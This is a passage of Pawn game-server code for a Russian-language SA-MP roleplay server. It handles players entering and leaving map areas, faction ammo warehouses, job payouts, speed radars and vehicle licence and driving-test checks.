	else if(areaid == AreaInfo[arUnivTest] && player_state == PLAYER_STATE_ONFOOT)
	{
	    if(GetPVarInt(playerid, "univer") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "\
		Пересдавать можно раз в 10 минут!");
	    if(PI[playerid][pWatch] == 0) return SendClientMessage(playerid, COLOR_GREY, "\
		Вы не поступали в Университет!");
       	ShowPlayerDialog(playerid, D_UNIVER+1, DIALOG_STYLE_MSGBOX, "Университет", "\
		   {63BD4E}Начать сдачу экзамена\n\
		   {afafaf}Если Вы готовы, нажмите `Далее`", "Далее", "Отмена");
	}
	/*else if(areaid == AreaInfo[arInfoIce] && player_state == PLAYER_STATE_ONFOOT) //Егор
	{
		new fmt_msg[70];

        STRING_GLOBAL[0] = EOS;
		format(fmt_msg, sizeof fmt_msg, "{ffffff}ООО \"Айсберг\" - компания которая реализует инвестиционный\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "цикл полностью, начиная от выбора площадки, получения\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "земельного участка, эскизных проектов, предпроектных\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "экономических расчетов стоимости строительства, выбора\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "ведущих специалистов, архитекторов и проектных организаций,\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "подрядчиков, координации всех процессов строительства до\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "сдачи законченного строительством объекта в эксплуатацию, с\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "четким финансированием всех ступеней процесса.\n\n");
		strcat(STRING_GLOBAL, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "Владелец компании - Kirill_Putbulll");
		strcat(STRING_GLOBAL, fmt_msg);

		ShowPlayerDialog
		(
			playerid, 0, DIALOG_STYLE_MSGBOX,
			"{ffcc00}ООО \"Айсберг\"",
			STRING_GLOBAL,
			"Закрыть", ""
		);
	}*/
	else if(areaid == AreaInfo[arBuyCopter])
	{
		SetPlayerPos(playerid, 2357.7861,-1845.6462,33.1497);
		// 2339.5859, -1780.8318, 33.2012 -139.0800
		SetPlayerCameraPos(playerid, 2360.9397, -1781.4974, 38.2566);
		SetPlayerCameraLookAt(playerid, 2359.9360, -1781.4890, 38.0713);
		InShop[playerid] = 3;
		pPressed[playerid] = 0;
		DestroyVehicle(PI[playerid][SalonCarID]);
		new vehid = PI[playerid][SalonCarID] = CreateVehicle(copter_cars[0][copID],2339.5859, -1780.8318, 33.201,-139.0800,colors[playerid][0]=random(10),colors[playerid][1]=random(10),10000);
		g_vehicle[vehid][veh_x] = 2339.5859;
		g_vehicle[vehid][veh_y] = -1780.8318;
		g_vehicle[vehid][veh_z] = 33.201;

		for(new idx = 0; idx < 13; idx ++) PlayerTextDrawShow(playerid, buy_copter[idx][playerid]);
		new fmt_text[50];

		format(fmt_text, sizeof fmt_text, "СТОИМОСТЬ: ~y~%d РУБЛЕЙ", copter_cars[0][copCost]);
		PlayerTextDrawSetString(playerid, buy_copter[5][playerid], fmt_text);

		SelectTextDraw(playerid, 0x009900FF);

		TogglePlayerControllable(playerid, 0);
		PlayerLastTick[playerid] = GetTickCount();
		SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
		SetPlayerVirtualWorld(playerid, playerid);
	}
	else if(areaid == AreaInfo[arArendBall])
	{
		if(g_arend_ball_status == true)
			return SendClientMessage(playerid, C_RED, "К сожалению сейчас на шаре уже летают");

		ShowPlayerDialog
		(
			playerid, DIALOG_AREND_BALL, DIALOG_STYLE_MSGBOX,
			"{ffcc00}Полёт на воздушном шаре",
			"{ffffff}Полет на воздушном шаре - это яркое воздушное приключение и удивительная возможность \n"\
			"подарить себе самые яркие впечатления.\n\n"\
			"Стоимость полёта: {ffcc00}50000 рублей",
			"Далее", "Отмена"
		);
	}
    else if(areaid == AreaInfo[arArmyAmmo] && player_state == PLAYER_STATE_ONFOOT)
	{
		if(IsAArmy(playerid))
		{
			new gunamount = GetPVarInt(playerid,"carrygun");
			new ammo = GetPVarInt(playerid,"carryammo");
			if(gunamount || ammo)
			{
				SetPVarInt(playerid,"carrygun",0);
				SetPVarInt(playerid,"carryammo",0);
				ApplyAnimation(playerid,"CARRY","putdwn",1.0,0,1,1,0,0,1);
				RemovePlayerAttachedObject(playerid, 3);
				if(gArmyWarehouse[0] + gunamount > 100000) return SendClientMessage(playerid, C_RED, "\
				На складе недостаточно места для боеприпасов");
				else gArmyWarehouse[0] += gunamount;
				if(gArmyWarehouse[1] + ammo > 100000) return SendClientMessage(playerid, C_RED, "\
				На складе недостаточно места для патронов");
				else gArmyWarehouse[1] += ammo;
				new string[128];
				format(string,sizeof(string),"{FFFFFF}Патронов: {63BD4E}%d", gArmyWarehouse[1]);
				UpdateDynamic3DTextLabelText(gArmyWarehouseText,0xFFFFFFFF,string);
			}
			else
			{
				if(gArmyWarehouse[0] < 300 || gArmyWarehouse[1] < 135 && !IsAArmy(playerid)) return SendClientMessage(playerid, C_RED, "На складе недостаточно боеприпасов");
			}
		}
	}
	else if(areaid == AreaInfo[arItMaAmmo] && player_state == PLAYER_STATE_ONFOOT)
	{
		if(IsAMafia(playerid))
		{
			new gunamount = GetPVarInt(playerid,"carrygun");
			new ammo = GetPVarInt(playerid,"carryammo");
			if(gunamount || ammo)
			{
				SetPVarInt(playerid,"carrygun",0);
				SetPVarInt(playerid,"carryammo",0);
				ApplyAnimation(playerid,"CARRY","putdwn",1.0,0,1,1,0,0,1);
				RemovePlayerAttachedObject(playerid, 3);
				if(MafiaEd[0] + gunamount > 100000) return SendClientMessage(playerid, C_RED, "\
				На складе недостаточно места для боеприпасов");
				else MafiaEd[0] += gunamount;
				if(MafiaPatr[0] + ammo > 100000) return SendClientMessage(playerid, C_RED, "\
				На складе недостаточно места для патронов");
				else MafiaPatr[0] += ammo;
				new string[400];
				format(string,sizeof(string),"{993366}Итальянская Мафия\n\n{FFFFFF}Патроны: {63BD4E}%d\n{FFFFFF}Наркотики: {63BD4E}%d\n{FFFFFF}Деньги: {63BD4E}%d\n{FFFFFF}Кол-во контролируемых бизнесов: {63BD4E}%i\n\n{FFFFFF}Склад: %s", MafiaPatr[0], DrugsBank[TEAM_OPG1], FracBank[6], MafiaTotalBizz[0], b_Sklad{5}?("{F04245}Закрыт"):("{63BD4E}Открыт"));
				UpdateDynamic3DTextLabelText(Mafia3d[0],0xFFFFFFFF,string);
			}
			else
			{
				if(MafiaEd[0] < 300 || MafiaPatr[0] < 135 && !IsAMafia(playerid)) return SendClientMessage(playerid, C_RED, "На складе недостаточно боеприпасов");
			}
		}
	}
	else if(areaid == AreaInfo[arRuMaAmmo] && player_state == PLAYER_STATE_ONFOOT)
	{
		if(IsAMafia(playerid))
		{
			new gunamount = GetPVarInt(playerid,"carrygun");
			new ammo = GetPVarInt(playerid,"carryammo");
			if(gunamount || ammo)
			{
				SetPVarInt(playerid,"carrygun",0);
				SetPVarInt(playerid,"carryammo",0);
				ApplyAnimation(playerid,"CARRY","putdwn",1.0,0,1,1,0,0,1);
				RemovePlayerAttachedObject(playerid, 3);
				if(MafiaEd[1] + gunamount > 100000) return SendClientMessage(playerid, C_RED, "\
				На складе недостаточно места для боеприпасов");
				else MafiaEd[1] += gunamount;
				if(MafiaPatr[1] + ammo > 100000) return SendClientMessage(playerid, C_RED, "\
				На складе недостаточно места для патронов");
				else MafiaPatr[1] += ammo;
			}
			else
			{
				if(MafiaEd[1] < 300 || MafiaPatr[1] < 135 && !IsAMafia(playerid)) return SendClientMessage(playerid, C_RED, "На складе недостаточно боеприпасов");
			}
		}
	}
    else if(areaid == Ships[playerid] && player_state == PLAYER_STATE_DRIVER)
    {
        new panels, tires;
        GetVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doors, lights, tires);
        UpdateVehicleDamageStatus(GetPlayerVehicleID(playerid), panels, doors, lights, 15);
    }
    else if(IsAArmy(playerid) || IsAMafia(playerid)) // тут разгрузка
	{
	    foreach(new vehicleid:VehicleGun)
		{
			if(areaid == gVehicleGun[vehicleid][vGunArea])
			{
       			new string[128];
				if(gVehicleGun[vehicleid][vGunLoading] == true && (GetPVarInt(playerid, "carrygun") || GetPVarInt(playerid, "carryammo")))
				{
					new gunamount = GetPVarInt(playerid, "carrygun");
					new ammo = GetPVarInt(playerid, "carryammo");
					SetPVarInt(playerid, "carrygun", 0);
					SetPVarInt(playerid, "carryammo", 0);
					RemovePlayerAttachedObject(playerid, 3);
					ApplyAnimation(playerid, "CARRY", "putdwn", 1.0, 0, 1, 1, 0, 0, 1);
					if(gVehicleGun[vehicleid][vGunGunAmount] + gunamount > 5000 || gVehicleGun[vehicleid][vGunAmmo] + ammo > 5000) return SendClientMessage(playerid, C_RED, "В транспорте недостаточно места");
					if(gunamount) gVehicleGun[vehicleid][vGunGunAmount] += gunamount;
					if(ammo) gVehicleGun[vehicleid][vGunAmmo] += ammo;
					format(string, sizeof(string), "{FFFFFF}Патронов: {63BD4E}%d", gVehicleGun[vehicleid][vGunAmmo]);
					UpdateDynamic3DTextLabelText(gVehicleGun[vehicleid][vGunText], 0xFFFFFFFF, string);
				}
				else if(gVehicleGun[vehicleid][vGunUnloading] == true && !GetPVarInt(playerid, "carrygun") && !GetPVarInt(playerid, "carryammo"))
				{
					if(gVehicleGun[vehicleid][vGunGunAmount] < 300 && gVehicleGun[vehicleid][vGunAmmo] < 300) return SendClientMessage(playerid, C_RED, "В транспорте недостаточно боеприпасов");
					if(gVehicleGun[vehicleid][vGunGunAmount] >= 300)
					{
						gVehicleGun[vehicleid][vGunGunAmount] -= 300;
						SetPVarInt(playerid, "carrygun", 300);
					}
					if(gVehicleGun[vehicleid][vGunAmmo] >= 300)
					{
						gVehicleGun[vehicleid][vGunAmmo] -= 300;
						SetPVarInt(playerid, "carryammo", 300);
					}
					ApplyAnimation(playerid, "CARRY", "liftup", 1.0, 0, 1, 1, 0, 0, 1);

					format(string, sizeof(string), "{FFFFFF}Патронов: {63BD4E}%d", gVehicleGun[vehicleid][vGunAmmo]);
					UpdateDynamic3DTextLabelText(gVehicleGun[vehicleid][vGunText], 0xFFFFFFFF, string);

					SetPlayerAttachedObject(playerid,3,2969,1,0.075578,0.407083,0.000000,1.248928,97.393852,359.645050,1.000000,1.000000,1.000000); // ящик
					ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1); // анимация, что несет
					SetTimerEx("CarryDelay", 1000, false, "i", playerid);
					//SetPlayerAttachedObject(playerid, 0, 2358, 6, 0.0, 0.10, -0.2, -110.0, 0.0, 78.0);
				}
				//else SendClientMessage(playerid, COLOR_GREY, "Ошибка");
				return 1;
			}
		}
	}
	for(new r = 0; r < TOTALRADAR; r++)
	{
		if(areaid == RI[r][r_area])
		{
			if(radar_time[playerid] > gettime()) return 1;

			new vehicleid = GetPlayerVehicleID(playerid);

			if(!IsAMoped(vehicleid) && !IsAVel(vehicleid) && !IsAPlane(vehicleid) && GetPlayerState(playerid) == 2)
			{
				if(SpeedVehicle(playerid) > RI[r][r_speed])
				{
					if(!IsACop(playerid))
					{
						radar_time[playerid] = gettime() + 10;

						new reason[35];

						format(reason, sizeof reason, "Превышение скорости на %d км/ч", SpeedVehicle(playerid) - RI[r][r_speed]);
						WritePlayerFine(playerid, SpeedVehicle(playerid) * 1000 / 2, reason);
					}
				}
			}
		}
	}
    for(new i = TOTALBIZZ; i > 0; i --)
    {
        if(areaid == BizzInfo[i][bMenu] && player_state == PLAYER_STATE_ONFOOT)
        {
			switch(BizzInfo[i][bType])
			{
			    case 1: MagazineList(playerid);
			    case 3: EatList(playerid, i);
			    case 4,5,9: BarList(playerid);
			    case 6: GunShopList(playerid);
			    case 8: SkinShopList(playerid);
				case 10: ShowPlayerOrdersList(playerid);
				case 11: ShowPlayerDialog(playerid, D_JOINCARS, 0, "Автосалон", "{FFFFFF}Вас приветствует автосалон!\nПерейти к покупке транспорта?", "Перейти", "Закрыть");
				case 12: ShowPlayerDialog(playerid, D_JOINCARS, 0, "Автосалон", "{FFFFFF}Вас приветствует автосалон!\nПерейти к покупке транспорта?", "Перейти", "Закрыть");
			}
		}
    }
    for(new i; i < sizeof(AreaInfo[arGreenZone]); i++)
	{
		if(GetPVarInt(playerid, "stop_bus") == 1) return 1;

		if(PI[playerid][SalonCarID] != INVALID_VEHICLE_ID) return 1;

		if(areaid == AreaInfo[arGreenZone][i])
        {
			TextDrawShowForPlayer(playerid, server_green_zone[0]);
		}
	}
    return 1;
}

public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	if(PI[playerid][P_JOB] != JOB_NONE)
	{
		if(PI[playerid][P_JOB] == JOB_MINER)
		{
			if(areaid == AreaInfo[arLeaveJob][1])
			{
				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Рабочий день завершён. Вы добыли: {FF9900}%d кг {37c268}руды",pPressed[playerid]);
				SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

				if(!doubling_donate)
				{
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей.",pPressed[playerid]*7);
					SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*7);
					GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

					GiveMoney(playerid, pPressed[playerid]*7, "Зарплата на шахте");
				}
				else
				{
				    format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Заработано {FF9900}%d {37c268}рублей.",pPressed[playerid]*11);
					SendClientMessage(playerid, C_CROM, STRING_GLOBAL);

					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%i RUB",pPressed[playerid]*11);
					GameTextForPlayer(playerid, STRING_GLOBAL, 5000, 1);

					GiveMoney(playerid, pPressed[playerid]*11, "Зарплата на шахте");
				}

	   			RemovePlayerAttachedObject(playerid,1);
			   	RemovePlayerAttachedObject(playerid,2);// забрали тачку
			   	RemovePlayerAttachedObject(playerid,3);// забрали тачку

				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

				DisablePlayerCheckpoint(playerid);
				PI[playerid][P_JOB] = JOB_NONE;
				pPressed[playerid] = 0;
				SetPVarInt(playerid, "relate", 0);
			}
		}
		if(PI[playerid][P_JOB] == JOB_GRUZ_WOOD)
		{
			if(areaid == AreaInfo[arLeaveJob])
			{
				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					else SetPlayerSkin(playerid, PI[playerid][pModel]);

				DisablePlayerCheckpoint(playerid);
				PI[playerid][P_JOB] = JOB_NONE;
				pPressed[playerid] = 0;
				DeletePVar(playerid, "relate");

				if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
					RemovePlayerAttachedObject(playerid, 4);

				if(!doubling_donate)
				{
				    new money = pPressed[playerid]*5;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money, "Зарплата на грузчиках");
				}
				else
				{
				    new money = pPressed[playerid]*9;

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money, "Зарплата на грузчиках");
				}

				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);

			}
		}
		if(PI[playerid][P_JOB] == JOB_LOGGER)
		{
			if(areaid == AreaInfo[arLeaveJob])
			{
				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					else SetPlayerSkin(playerid, PI[playerid][pModel]);

				DisablePlayerCheckpoint(playerid);
				PI[playerid][P_JOB] = JOB_NONE;
				pPressed[playerid] = 0;
				DeletePVar(playerid, "relate");

				if(IsPlayerAttachedObjectSlotUsed(playerid, 3))
					RemovePlayerAttachedObject(playerid, 3);

				if(IsPlayerAttachedObjectSlotUsed(playerid, 4))
					RemovePlayerAttachedObject(playerid, 4);

				if(!doubling_donate)
				{
		            new money = pPressed[playerid]*3;
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money, "Зарплата");
				}
				else
				{
		            new money = pPressed[playerid]*6;
					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof STRING_GLOBAL, "{e0c600}Вы закончили рабочий день, Ваш заработок: %iр",money);
					SendClientMessage(playerid, COLOR_WHITE, STRING_GLOBAL);

					STRING_GLOBAL[0] = EOS;
					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "~g~+%dр", money);
					GameTextForPlayer(playerid,STRING_GLOBAL,3000,1);

					GiveMoney(playerid, money, "Зарплата");
				}

				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
				else SetPlayerSkin(playerid, PI[playerid][pModel]);
			}
		}
		if(PI[playerid][P_JOB] == JOB_FARMER)
		{
			if(areaid == AreaFarmer)
			{
				if(PI[playerid][pMember]) SetPlayerSkin(playerid, PI[playerid][pMemberSkin]);
					else SetPlayerSkin(playerid, PI[playerid][pModel]);

				DisablePlayerCheckpoint(playerid);
				PI[playerid][P_JOB] = 0;
				pPressed[playerid] = 0;
				DeletePVar(playerid, "relate");

				if(IsPlayerAttachedObjectSlotUsed(playerid, 2))
					RemovePlayerAttachedObject(playerid, 2);

				SendClientMessage(playerid, C_RED, "Вы ушли от места работы, Ваша зарплата аннулирована");
			}
		}
	}

    for(new i; i < sizeof(AreaInfo[arGreenZone]); i++)
	{
		if(areaid == AreaInfo[arGreenZone][i])
        {
			TextDrawHideForPlayer(playerid, server_green_zone[0]);
		}
	}
	return 1;
}

public OnPlayerGiveDamage(playerid, damagedid, Float:amount, weaponid)
{
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(newstate == 2) PTick[playerid] = GetTickCount() + 250;
	if(oldstate == 2)
	{
		if(GetTickCount() - PTick[playerid] < 250 && InShop[playerid] == 0)
		{
			CallAntiCheat(playerid, "Bike Crash", 83);
			return 1;
		}
	}
	if(newstate==oldstate)
    {
        CallAntiCheat(playerid, "State change", 85);
        return 1;
    }
    if(newstate == PLAYER_STATE_PASSENGER)
	{
	    switch(GetPlayerWeapon(playerid))
	    {
	        case 24,31,26,28,29,30,33: SetPlayerArmedWeapon(playerid, 0);
	    }
    }
	/*if(newstate == PLAYER_STATE_DRIVER)
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		if(g_vehicle[vehicleid][veh_autosalon] == true && g_vehicle[vehicleid][veh_owner_id] == INVALID_PLAYER_ID)
		{
			ShowPlayerAutoSalonInfo(playerid, vehicleid);
			return 1;
		}
	}*/
	if(oldstate == PLAYER_STATE_DRIVER)
	{
		SetVehicleData(PI[playerid][P_LAST_VEHICLE], veh_driver_id, INVALID_PLAYER_ID);
	}
	switch(newstate)
	{
		case 1: //Игрок пешком (можно писать PLAYER_STATE_ONFOOT)
		{
			if(STimer[playerid] != -1) KillTimer(STimer[playerid]), STimer[playerid] = -1;
			if(engine_improvement[playerid] != -1) KillTimer(engine_improvement[playerid]), engine_improvement[playerid] = -1;
			//if(!InShop[playerid]) return;
			if(GetPVarInt(playerid, "DrivingTest"))
			{
				SendClientMessage(playerid, C_RED, "У Вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				DrivingTestTime[playerid] = 15;
			}
			if(GetPVarInt(playerid, "FlyTest"))
			{
				SendClientMessage(playerid, C_RED, "У Вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				FlyTestTime[playerid] = 15;
			}
			if(GetPVarInt(playerid, "WaterTest") && GetPVarInt(playerid, "WaterTestTimeOn"))
			{
				SendClientMessage(playerid, C_RED, "У Вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				WaterTestTime[playerid] = 15;
			}
			if(GetPVarInt(playerid, "PriceBus"))
			{
				SendClientMessage(playerid, C_RED, "У Вас есть 15 секунд, чтобы вернуться");
				DisablePlayerRaceCheckpoint(playerid);
				SetPVarInt(playerid, "BusTime", 15);
				DeletePVar(playerid, "TimeBus");
			}
			if(GetPVarInt(playerid, "TruckerJob"))
			{
				SendClientMessage(playerid, COLOR_RED, "У Вас есть 2 минуты, чтобы вернуться");
				DisablePlayerCheckpoint(playerid);
				SetPVarInt(playerid, "TruckerJobTime", 120);
			}
		}
		case 2: //Игрок в машине, на месте водителя (можно писать PLAYER_STATE_DRIVER)
		{
			new cars = 0;
			if(InShop[playerid] < 1|| GetPVarInt(playerid, "InShop") == 0)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				SetVehicleData(vehicleid, veh_driver_id, playerid);
				PI[playerid][P_LAST_VEHICLE] = vehicleid;
				new temp = GetVehicleModel(GetPlayerVehicleID(playerid));
				BE_Play_Check[playerid] = true;
				for(new i; i != sizeof(BE_Bad_Vehs); i++)
				{
					if(temp == BE_Bad_Vehs[i]) cars++, BE_Play_Check[playerid] = false;
				}
				if(IsABoat(vehicleid))
				{
					if(g_player_skills[playerid][S_LICS][1] != 1)
					{
					    if(GetPVarInt(playerid, "WaterTest")) { }
						else
						{
							SendClientMessage(playerid, COLOR_GREY, "У Вас нет лицензии на водный транспорт!");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
					}
				}
				if(IsAPlane(vehicleid))
				{
					if(g_player_skills[playerid][S_LICS][2] != 1)
					{
					    if(GetPVarInt(playerid, "FlyTest")) { }
					    else
					    {
							SendClientMessage(playerid, COLOR_GREY, "У Вас нет лицензии на воздушный транспорт!");
							RemovePlayerFromVehicle(playerid);
							return 1;
						}
					}
					if(GetVehicleData(vehicleid, veh_engine) == false) SendClientMessage(playerid, COLOR_WHITE, "Чтобы завести двигатель воздушного транспорта введите /engine");
					if(!InShop[playerid])
					{
						STimer[playerid] = SetTimerEx("UpdateSpeedometrCopter", 1000, true, "i", playerid);
						ShowSpeedometerCoptrer(playerid);
					}
				}
				if(vehicleid >= AutoCar[0] && vehicleid <= AutoCar[1] && GetPVarInt(playerid, "DrivingTest") == 1)
				{
  					SendClientMessage(playerid, 0xffd83dFF, "Вы начали практическую часть экзамена на получение водительских прав!");
					SendClientMessage(playerid, 0xffd83dFF, "Если вы допустете больше 2 ошибок, тест будет провален");
					SendClientMessage(playerid, 0xffd83dFF, "Следуйте по чекпоинтам и пройдите весь маршрут!");
					new i = pPressed[playerid];
					SetPlayerRaceCheckpoint(playerid,0,DrivingTest[i][0],DrivingTest[i][1],DrivingTest[i][2],DrivingTest[i][3],DrivingTest[i][4],DrivingTest[i][5],5.0);
				}
				else if(vehicleid >= AutoCar[0] && vehicleid <= AutoCar[1])
				{
					SendClientMessage(playerid, COLOR_GREY, "Вы не сдаете тест на вождение!");
					RemovePlayerFromVehicle(playerid);
				}
				/*for(new v = TOTALVEH; v > 0; v --)
				{
					if(vehicleid == VehInfo[v][vVehicle])
					{
						if(VehInfo[v][vFraction] == TEAM_AUTOSCHOOL && GetPVarInt(playerid, "DrivingTest") > 0)
						{
						    if(UseGPS[playerid])
							{
						    	DisablePlayerRaceCheckpoint(playerid);
						    	UseGPS[playerid] = false;
						    	for(new i; i < 3; i++) TextDrawHideForPlayer(playerid, gps_td);
							}
							SendClientMessage(playerid, COLOR_BLUE, "Следуйте по чекпоинтам, соблюдая правила дорожного движения");
       						ShowPlayerDialog(playerid, D_NULL, 0, " ", "\n\n{ffffff}Ваша задача следовать по чекпоинтам. Вперед\n\n", "Закрыть", "");
							new i = pPressed[playerid];
							SetPlayerRaceCheckpoint(playerid,0,DrivingTest[i][0],DrivingTest[i][1],DrivingTest[i][2],DrivingTest[i][3],DrivingTest[i][4],DrivingTest[i][5],5.0);
						}
						else if(VehInfo[v][vFraction] == TEAM_AUTOSCHOOL && GetPVarInt(playerid, "FlyTest") > 0
						&& VehInfo[v][vVehicle] == vehicleid && (v >= 12 && v <= 12))
						{
						    if(UseGPS[playerid])
							{
						    	DisablePlayerRaceCheckpoint(playerid);
						    	UseGPS[playerid] = false;
						    	for(new i; i < 3; i++) TextDrawHideForPlayer(playerid, gps_td);
							}
						    SendClientMessage(playerid, COLOR_BLUE, "Следуйте по чекпоинтам, соблюдая правила полёта");
   						 	ShowPlayerDialog(playerid, D_NULL, 0, " ", "\n\n{ffffff}Ваша задача следовать по чекпоинтам. Вперед\n\n", "Закрыть", "");
							new i = pPressed[playerid];
							SetPlayerRaceCheckpoint(playerid,3,FlyTest[i][0],FlyTest[i][1],FlyTest[i][2],FlyTest[i][3],FlyTest[i][4],FlyTest[i][5],5.0);
						}
						else if(VehInfo[v][vFraction] == TEAM_AUTOSCHOOL && GetPVarInt(playerid, "WaterTest") > 0
						&& VehInfo[v][vVehicle] == vehicleid && (v >= 13 && v <= 14))
						{
						    if(UseGPS[playerid])
							{
						    	DisablePlayerRaceCheckpoint(playerid);
						    	UseGPS[playerid] = false;
						    	for(new i; i < 3; i++) TextDrawHideForPlayer(playerid, gps_td);
							}
						    SendClientMessage(playerid, COLOR_BLUE, "Следуйте по чекпоинтам, соблюдая правила движения");
   						 	ShowPlayerDialog(playerid, D_NULL, 0, " ", "\n\n{ffffff}Ваша задача следовать по чекпоинтам. Вперед\n\n", "Закрыть", "");
							new i = pPressed[playerid];
							if(!GetPVarInt(playerid, "WaterTestTimeOn")) SetPVarInt(playerid, "WaterTestTimeOn", 1);
							SetPlayerRaceCheckpoint(playerid,0,WaterTest[i][0],WaterTest[i][1],WaterTest[i][2],WaterTest[i][3],WaterTest[i][4],WaterTest[i][5],5.0);
						}
						if(VehInfo[v][vFraction] != PI[playerid][pMember])
						{
							if(VehInfo[v][vFraction] == TEAM_AUTOSCHOOL && (GetPVarInt(playerid, "DrivingTest") > 0 || GetPVarInt(playerid, "FlyTest") > 0 || GetPVarInt(playerid, "WaterTest") > 0)) { }
							else
							{
								SendClientMessage(playerid, C_RED, "Этот транспорт вам недоступен!");
								RemovePlayerFromVehicle(playerid);
								return 1;
							}
						}
						//else break;
					}
				}*/
				if(cars == 0)
				{
					if(g_player_skills[playerid][S_LICS][0] == 0)
					{
						if(GetPVarInt(playerid, "DrivingTest") == 1) { }
						else
						{
                            if(!IsAMoped(vehicleid) && !IsAVel(vehicleid))
							{
								SendClientMessage(playerid, COLOR_GREY, "У Вас нет водительских прав!");
								RemovePlayerFromVehicle(playerid);
								return 1;
							}
						}
					}
					if(GetVehicleData(vehicleid, veh_engine) == false)
					{
						if(IsAVel(vehicleid))
						{
							GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
							SetVehicleParamsEx(vehicleid,true,lights,alarm,doors,bonnet,boot,objective);
						}
					    if(!InShop[playerid])
						{
							SendClientMessage(playerid, -1, "Для запуска двигателя нажмите {37c268}L.CTRL{ffffff}, для включения габаритов: {37c268}ЛКМ");
							SendClientMessage(playerid, -1, "Меню управления транспортным средством: {37c268}/cm");
						}
					}
					if(!IsAMoped(vehicleid) && !IsAVel(vehicleid) && !IsABoat(vehicleid))
					{
					    if(!InShop[playerid])
					    {
							//STimer[playerid] = SetTimerEx("UpdateSpeedometr", 1000, true, "i", playerid);
							STimer[playerid] = SetTimerEx("UpdateSpeedometr", 500, true, "i", playerid);
							if(GetVehicleData(vehicleid, veh_owner_id) != INVALID_PLAYER_ID && GetVehicleData(vehicleid, veh_improve) != 0) engine_improvement[playerid] = SetTimerEx("EngineImprovement", 220, true, "i", playerid);
						}
					}
					if(vehicleid == TruckerCar[playerid])//дальнобойщик
					{
                        if(GetPVarInt(playerid, "TruckerJob") == 1)
                        {
							if(GetPVarInt(playerid, "MetkaJob") == 1) {
                                SetPlayerCheckpoint(playerid, 1786.4874,2268.5398,15.7698,5.0);
							}
							else if(GetPVarInt(playerid, "MetkaJob") == 2) {
                                SetPlayerCheckpoint(playerid, -2451.6064,660.0789,5.3688,5.0);
							}
							else if(GetPVarInt(playerid, "MetkaJob") == 3) {
                                SetPlayerCheckpoint(playerid, -2488.6279,622.1194,5.3688,5.0);
							}
							else if(GetPVarInt(playerid, "MetkaJob") == 4) {
                                SetPlayerCheckpoint(playerid, 2738.2620,-2274.9829,17.9269,5.0);
							}
							else if(GetPVarInt(playerid, "RazgJob") == 1) {
                                SetPlayerCheckpoint(playerid, 2466.8582,-649.5677,12.2153,5.0);
							}
